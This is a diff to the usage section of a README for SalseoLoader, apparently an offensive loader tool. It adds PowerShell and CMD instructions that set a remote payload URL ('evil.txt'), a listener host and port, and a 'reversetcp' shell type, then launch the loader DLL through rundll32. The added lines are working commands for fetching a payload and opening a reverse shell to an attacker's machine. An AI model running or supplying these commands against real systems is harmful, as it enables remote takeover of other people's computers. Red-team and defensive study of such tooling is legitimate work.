@@ -98,13 +98,23 @@ Executable usage:
 ```
 SalseoLoader.exe <PASSWORD> <PAYLOAD PATH> <SHELL TYPE> <LHOST> <LPORT>
 ```
-Library usage:
+Library usage on Powershell:
 ```
 set $env:pass="password"
 set $env:payload="http://10.10.10.10/evil.txt"
 set $env:lhost="10.10.10.10"
 set $env:lport="1337"
 set $env:shell="reversetcp"
+rundll32.exe SalseoLoader.dll,main
+```
+
+Library usage on CMD:
+```
+set pass="password"
+set payload="http://10.10.10.10/evil.txt"
+set lhost="10.10.10.10"
+set lport="1337"
+set shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
 
